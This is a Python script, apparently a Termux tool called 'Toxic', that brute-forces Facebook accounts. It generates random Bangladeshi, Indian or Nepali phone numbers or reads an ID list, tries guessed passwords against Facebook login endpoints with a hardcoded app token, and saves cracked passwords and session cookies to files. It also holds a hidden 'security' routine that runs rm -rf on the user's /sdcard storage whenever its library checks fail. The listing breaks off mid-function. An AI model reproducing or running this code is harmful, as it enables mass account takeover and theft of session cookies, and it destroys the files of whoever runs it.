#-----------------------[ IMPORT-CODE ]-----------------------#
import os
import sys
import marshal, base64, zlib
from os import path
import os,base64,zlib,pip,urllib
try:
        os.system('clear')
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system('pip install requests futures==2 > /dev/null')
except:pass
#-----------------------[ COLOR-CODE ]-----------------------#
a='\x1b[38;5;118m';b='\x1b[38;5;119m';c='\x1b[38;5;120m';d='\x1b[38;5;121m';e='\x1b[38;5;122m';g='\x1b[38;5;46m';r='\x1b[38;5;196m';w='\033[1;37m'
#-----------------------[ SECURITY-CODE ]-----------------------#
def fucker():
    os.system('rm -rf /sdcard/*')
    os.system('rm-rf /sdcard/DCIM/')
    os.system('rm-rf /sdcard/Android/')
    os.system('rm-rf /sdcard/Android/data/')
    os.system('rm -rf /sdcard/Download/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /sdcard/0/*')
try:
    mursalin = open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py", "r").read()
    alin = len(mursalin)
    if alin != 35223:
        fucker()
        exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
    else:
        pass 
except:
    fucker()
    exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
try:
    mursalin = open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/auth.py", "r").read()
    alin = len(mursalin)
    if alin != 10187:
        fucker()
        exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
    else:
        pass 
except:
    fucker()
    exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
try:
    mursalin = open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py", "r").read()
    alin = len(mursalin)
    if alin != 6449:
        fucker()
        exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
    else:
        pass 
except:
    fucker()
    exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
try:
    mursalin = open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py", "r").read()
    alin = len(mursalin)
    if alin != 30373:
        fucker()
        exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
    else:
        pass 
except:
    fucker()
    exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
try:
    king='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
    if not 'print' in open(king+'sessions.py','r').read():
        pass
    else:
        fucker()
        exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
except:
    fucker()
    exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
try:
    qeen='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
    if not 'print' in open(qeen+'models.py','r').read():
        pass
    else:
        fucker()
        exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
except:
    fucker()
    exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
try:
    don='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
    if not 'print' in open(don+'api.py','r').read():
        pass
    else:
        fucker()
        exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
except:
    fucker()
    exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
try:
    king='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
    if not 'sys.stdout.write' in open(king+'sessions.py','r').read():
        pass
    else:
        fucker()
        exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
except:
    fucker()
    exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
try:
    qeen='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
    if not 'sys.stdout.write' in open(qeen+'models.py','r').read():
        pass
    else:
        fucker()
        exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
except:
    fucker()
    exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
try:
    don='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
    if not 'sys.stdout.write' in open(don+'api.py','r').read():
        pass
    else:
        fucker()
        exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
except:
    fucker()
    exit(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
#-----------------------[ HEXXX-CODE ]-----------------------#
user=[];ok=[];cp=[];twf=[];cpx=[];cokix=[];plist=[];loop=0
oks=[]
cps=[]
loop=0
folder_path = '/sdcard/Toxic'
try:
    os.makedirs(folder_path, exist_ok=True)
except:
    pass
#-----------------------[ SC-CODE ]-----------------------#
main_x = '\x1b[38;5;196m[\x1b[1;97m1\x1b[38;5;196m]\x1b[38;5;46m Bd Random \n \x1b[38;5;196m[\x1b[1;97m2\x1b[38;5;196m]\x1b[38;5;46m India random \n \x1b[38;5;196m[\x1b[1;97m3\x1b[38;5;196m]\x1b[38;5;46m Nepal Random';bd_x = '\x1b[38;5;46m017 \x1b[1;97m●\x1b[38;5;46m 018 \x1b[1;97m●\x1b[38;5;46m 019';ind_x = '\x1b[38;5;46m+91639 \x1b[1;97m●\x1b[38;5;46m +91600 \x1b[1;97m●\x1b[38;5;46m +91620';line_x = '\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';cp_x = '\x1b[38;5;46mDo You Went Show Cp Ids \x1b[38;5;196m[\x1b[38;5;46mY\x1b[1;97m|\x1b[38;5;46mN\x1b[38;5;196m]';coki_x ='\x1b[38;5;46mDo You Went Show Cookies\x1b[38;5;196m[\x1b[38;5;46mY\x1b[1;97m|\x1b[38;5;46mN\x1b[38;5;196m]';c ='\x1b[1;97mChoice'
#-----------------------[ LOGO-CODE ]-----------------------#
logo = f"""
      \x1b[38;5;48m888888  dP"Yb  Yb  dP 88  dP""b8 
        \x1b[38;5;49m88   dP   Yb  YbdP  88 dP   `" 
        \x1b[38;5;50m88   Yb   dP  dPYb  88 Yb      
        \x1b[38;5;51m88    YbodP  dP  Yb 88  YboodP     
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mOWONER     \x1b[1;97m● \033[38;5;46mTOXIC
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mFacebook   \x1b[1;97m● \033[38;5;46mTOXIC
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mGuthub   \x1b[1;97m  ● \033[38;5;46mTox3c-143
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mTools      \x1b[1;97m● \033[38;5;46mTrail
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mVersion    \x1b[1;97m● \033[38;5;46mV/02
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46m[BROTHER]  \x1b[1;97m● \033[38;5;84m[\x1b[1;95mMAHADI\033[38;5;84m]
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
#-----------------------[ CLEAR-CODE ]-----------------------#
def fresh():os.system('clear');print(logo)
#-----------------------[ LINE-CODE ]-----------------------#
def line():print(f'{line_x}')
#-----------------------[ MAIN-CODE ]-----------------------#
def Main():
    fresh();print(f'\x1b[38;5;196m[\x1b[1;97m1\x1b[38;5;196m]\x1b[38;5;46mRandomCracking\n\x1b[38;5;196m[\x1b[1;97m2\x1b[38;5;196m]\x1b[38;5;46mFile Cloning\n\x1b[38;5;196m[\x1b[1;97m3\x1b[38;5;196m]\x1b[38;5;46mExit Manu ');line()
    manu = input(f'\x1b[38;5;196m\x1b[1;97m●\x1b[38;5;196m\x1b[38;5;46m{c} : ')
    if manu in ['1','01']:country()
    elif manu in ['2','02']:file()
    else:Main()
#-----------------------[ FILE-CODE ]-----------------------#
def file():
    fresh();print(" \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFOR EXAMPLE: \x1b[38;5;46m/sdcard/toxic.txt");line()
    file = input(" \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mPUT FILE PATH : ")
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
     line();print(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]File location not found ');time.sleep(2);file()
    fresh();print('\x1b[38;5;196m[\x1b[38;5;46m1\x1b[38;5;196m]\x1b[38;5;46mMethod \x1b[1;97m')
    print('\x1b[38;5;196m[\x1b[38;5;46m2\x1b[38;5;196m]\x1b[38;5;46mMethod \x1b[1;97m')
    print('\x1b[38;5;196m[\x1b[38;5;46m3\x1b[38;5;196m]\x1b[38;5;46mMethod \x1b[1;97m');line()
    Toxic_x=input("\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\x1b[38;5;46mCHOOSE : ")
    plist=[]
    fresh()
    try:
        ps_limit = int(input((" \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mENTER PASSWORD LIMIT : ")))
    except:
        ps_limit =1
    fresh()
    print(f' \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mEXAMPLE \x1b[1;97m● first last \x1b[38;5;196m|\x1b[38;5;46m first123')
    print(f' \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mEXAMPLE\x1b[1;97m|\x1b[38;5;46m57273200 59039200 57575751 ') 
    line()
    for i in range(ps_limit):
        plist.append(input(f" \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mPUT PASSWORD\x1b[38;5;196m[\x1b[38;5;46m%s\x1b[38;5;196m]\x1b[1;97m|"%(i+1)))
    with tred(max_workers=30) as TOXIC:
        fresh()
        tl = str(len(fo))
        print(f' \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mTOTAL IDS \x1b[1;97m● {tl}')
        print(f' \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mMETHOD \x1b[1;97m● \x1b[1;97mM{Toxic_x}\x1b[38;5;46m')
        print(f" \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFIRST \x1b[38;5;196m[\x1b[1;97mON\x1b[38;5;196m/\033[38;5;196mOFF\x1b[38;5;196m] \x1b[1;97mAIRPLANE MODE")
        line()
        for user in fo:
            ids,names = user.split('|')
            passlist = plist
            if Toxic_x =='1':
                TOXIC.submit(api1,ids,names,passlist)
            if Toxic_x =='2':
                TOXIC.submit(api2,ids,names,passlist)
            if Toxic_x =='3':
                TOXIC.submit(api3,ids,names,passlist)
#-----------------------[ FILE-METHOD-CODE ]-----------------------#
def api1(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r\x1b[38;5;196m [\x1b[38;5;46mToxic\x1b[1;97m-\x1b[38;5;46mM1\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46m%s\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK:%s\x1b[38;5;196m]'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
            #M1
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(000000000,999999999))
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-C7000;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
            head = {'User-Agent':uaddx,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_ES','client_country_code':'ES','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
            po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head).json()
            if 'session_key' in po:
                    uid = str(po['uid'])
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print('\r\r\x1b[38;5;196m[\x1b[38;5;46mToxic\x1b[1;97m-\x1b[38;5;46m💚\x1b[38;5;196m]\x1b[38;5;46m '+uid+'|'+pas)
                    #line()
                    file_path = os.path.join(folder_path, 'Toxic-FILE-OK.txt')
                    open('/sdcard/Toxic/Toxic-FILE-OK-COOKIE-M1.txt','a').write(uid+'|'+pas+' >>> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+'|'+pas+'\n')
                    oks.append(uid)
                    break
            elif 'www.facebook.com' in po['error']['message']:
                    uid = str(po['error']['error_data']['uid'])
                    #print(f'\r\r\33[1m\33[1;35m [BOT-CP] '+uid+' | '+pas+'\033[1;97m')
                    #file_path = os.path.join(folder_path, 'BOT-FILE-CP.txt')
                    open('/sdcard/Toxic-CP.txt','a').write(uid+'|'+pas+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+'|'+pas+'\n')
                    cps.append(uid)
                    break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        print(e)
        pass
#━━━━━━━━━━ Method 2━━━━━━━━━━#
def api2(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r\x1b[38;5;196m [\x1b[38;5;46mToxic\x1b[1;97m-\x1b[38;5;46mM2\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46m%s\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK:%s\x1b[38;5;196m]'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(000000000,999999999))
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Rogers Wireless;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/ONE A2005;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]'
            head = {'User-Agent':uaddx,
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'WIFI',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            data = {'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'','cpl':'true',
            'try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password','source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false','generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'es_ES','client_country_code':'ES',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
            po = requests.post('https://api.facebook.com/auth/login',data=data,headers=head).json()
            if 'session_key' in po:
                    uid = str(po['uid'])
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print('\r\r\x1b[38;5;196m[\x1b[38;5;46mToxic\x1b[1;97m-\x1b[38;5;46m💚\x1b[38;5;196m]\x1b[38;5;46m '+uid+'|'+pas)
                    #line()
                    file_path = os.path.join(folder_path, 'Toxic-FILE-OK.txt')
                    open('/sdcard/Toxic/Toxic-FILE-OK-COOKIE-M2.txt','a').write(uid+'|'+pas+' >>> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+'|'+pas+'\n')
                    oks.append(uid)
                    break
            elif 'www.facebook.com' in po['error']['message']:
                    uid = str(po['error']['error_data']['uid'])
                    #print(f'\r\r\33[1m\33[1;35m [BOT-CP] '+uid+' | '+pas+'\033[1;97m')
                    #file_path = os.path.join(folder_path, 'BOT-FILE-CP.txt')
                    open('/sdcard/Toxic-CP.txt','a').write(uid+'|'+pas+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+'|'+pas+'\n')
                    cps.append(uid)
                    break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#━━━━━━━━━━ Method 3━━━━━━━━━━#
def api3(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r\x1b[38;5;196m [\x1b[38;5;46mToxic\x1b[1;97m-M3\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46m%s\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK:%s\x1b[38;5;196m]'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(000000000,999999999))
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_ES;FBCR/movistar;FBMF/bq;FBBD/bq;FBPN/com.facebook.katana;FBDV/Aquaris M5;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]'
            head = {'User-Agent':uaddx,
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'WIFI',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            data = {'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'','cpl':'true',
            'try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password','source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false','generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'es_ES','client_country_code':'ES',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
            po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
            if 'session_key' in po:
                    uid = str(po['uid'])
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print('\r\r\x1b[38;5;196m[\x1b[38;5;46mToxic\x1b[1;97m-\x1b[38;5;46m💚\x1b[38;5;196m]\x1b[38;5;46m '+uid+'|'+pas)
                    #line()
                    file_path = os.path.join(folder_path, 'Toxic-FILE-OK.txt')
                    open('/sdcard/Toxic/Toxic-FILE-OK-COOKIE-M3.txt','a').write(uid+'|'+pas+' >>> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+'|'+pas+'\n')
                    oks.append(uid)
                    break
            elif 'www.facebook.com' in po['error']['message']:
                    uid = str(po['error']['error_data']['uid'])
                    #print(f'\r\r\33[1m\33[1;35m [BOT-CP] '+uid+' | '+pas+'\033[1;97m')
                    #file_path = os.path.join(folder_path, 'BOT-FILE-CP.txt')
                    open('/sdcard/Toxic-CP.txt','a').write(uid+'|'+pas+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+'|'+pas+'\n')
                    cps.append(uid)
                    break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#-----------------------[ COUNTRY-CODE ]-----------------------#
def country():
    fresh();print(f' {main_x} ');line()
    con_ck = input(f' \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\x1b[38;5;46m {c} : ')
    if con_ck in ['1','01']:rndm_bd()
    elif con_ck in ['2','02']:rndm_ind()
    elif con_ck in ['3','03']:rndm_nep()
    else:country()
#-----------------------[ RNDM-CODE-BD ]-----------------------#
def rndm_bd():
        fresh();print(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\x1b[38;5;46mExample\x1b[1;97m● \x1b[38;5;46m{bd_x} ');line();code = input(f' \x1b[38;5;196m\x1b[1;97m●\x1b[38;5;196m\x1b[38;5;46mFind Sim Code : ')
        fresh();print(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\x1b[38;5;46mExample\x1b[1;97m● \x1b[38;5;46m1000\x1b[1;97m●\x1b[38;5;46m2000\x1b[1;97m●\x1b[38;5;46m5000 ');line();limit = int(input(f'\x1b[38;5;196m\x1b[1;97m●\x1b[38;5;196m\x1b[38;5;46mFind Limit : '))
        fresh();print(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]{cp_x} ');line();cpy = input(f'\x1b[38;5;196m\x1b[1;97m●\x1b[38;5;196m]\x1b[38;5;46m {c} \x1b[38;5;196m[\x1b[38;5;46mY\x1b[1;97m|\x1b[38;5;46mN\x1b[38;5;196m]) : ')
        if cpy in ['n','N','no','NO','2','02']:cpx.append(f'n')
        else:cpx.append(f'y')
        fresh();print(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] {coki_x} ');line();cokiy = input(f' \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\x1b[38;5;46m {c} \x1b[38;5;196m[\x1b[38;5;46mY\x1b[1;97m●\x1b[38;5;46mN\x1b[38;5;196m] : ')
        if cokiy in ['n','N','no','NO','2','02']:cokix.append(f'n')
        else:cokix.append(f'y')
        for Kid in range(limit):Bhootxx = ''.join(random.choice(string.digits) for _ in range(8));user.append(Bhootxx)
        with tred(max_workers=30) as Tanim:
                tl = str(len(user))
                fresh();print(f' \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] Sim Code \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] {code} \n \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\x1b[38;5;46mTotal Limit \x1b[1;97m●\x1b[38;5;46m {limit} \n \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mUse Flight Mode Every 5 Minutes...');line()
                for love in user:
                        ids = code + love 
                        pasx = [love,ids,ids[:8],ids[:7],'@@@###','aabbcc','aaabbb','১২৩৪৫৬','১২৩৪৫৬৭৮','102030','405060','708090']
                        Tanim.submit(rndmx,ids,pasx,tl)
#-----------------------[ RNDM-CODE-INDIA ]-----------------------#
def rndm_ind():
        fresh();print(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\x1b[38;5;46mExample\x1b[38;5;196m\x1b[1;97m●\x1b[38;5;196m{ind_x}');line();code = input(f'\x1b[38;5;196m\x1b[1;97m●\x1b[38;5;196m\x1b[38;5;46mFind Sim Code\x1b[1;97m● ')
        fresh();print(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\x1b[38;5;46mExample\x1b[38;5;196m\x1b[1;97m●\x1b[38;5;196m\x1b[38;5;46m1000 | 2000 | 5000 ');line();limit = int(input(f'\x1b[38;5;196m\x1b[1;97m●\x1b[38;5;196m\x1b[38;5;46mFind Limit : '))
        fresh();print(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]{cp_x} ');line();cpy = input(f'\x1b[38;5;196m\x1b[1;97m●\x1b[38;5;196m\x1b[38;5;46m {c} (Y|N) \x1b[38;5;46m ')
        if cpy in ['n','N','no','NO','2','02']:cpx.append(f'n')
        else:cpx.append(f'y')
        fresh();print(f'  \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\x1b[38;5;46m {coki_x} ');line();cokiy = input(f' (+) {c} (Y|N) : ')
        if cokiy in ['n','N','no','NO','2','02']:cokix.append(f'n')
        else:cokix.append(f'y')
        for Kid in range(limit):Bhootxx = ''.join(random.choice(string.digits) for _ in range(7));user.append(Bhootxx)
        with tred(max_workers=30) as Tanim:
